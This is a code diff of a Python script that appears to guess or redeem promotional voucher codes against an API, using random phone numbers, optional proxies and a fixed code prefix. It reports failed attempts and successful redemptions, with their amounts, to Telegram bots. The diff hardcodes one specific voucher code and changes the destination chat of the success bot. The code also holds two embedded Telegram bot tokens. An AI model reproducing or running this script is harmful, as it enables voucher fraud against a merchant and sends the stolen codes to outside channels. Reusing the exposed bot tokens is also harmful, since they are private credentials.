@@ -24,7 +24,7 @@ def generate_random_phone():
 
 # Helper function to generate random voucher code
 def generate_random_voucher_code():
-    return "Y2GTV" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
+    return "Y2GTVY8X0D7C5EY" #"Y2GTV" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
 
 # Function to send message to Telegram bot
 def send_telegram_message(url, message):
@@ -87,7 +87,7 @@ def send_api_request(proxy=None):
         send_telegram_message("https://api.telegram.org/bot5453678885:AAGAmj13cf0BrWUuvqNb4Nemc2zFR4IhpTw/sendmessage?chat_id=-871155395", failed_message)
     elif response_data.get('resCode') == 0:  # Success response
         success_message = f"Success: Voucher Code {payload['vouchers'][0]['code']} - Amount: {response_data['amount']}"
-        send_telegram_message("https://api.telegram.org/bot5443217673:AAG2JGtn3gPGJ8UzKnTW2-l-p4tPt0A2NvQ/sendmessage?chat_id=-680337101", success_message)
+        send_telegram_message("https://api.telegram.org/bot5443217673:AAG2JGtn3gPGJ8UzKnTW2-l-p4tPt0A2NvQ/sendmessage?chat_id=-1001660096246", success_message)
     
     # Increment the request count
     request_count += 1
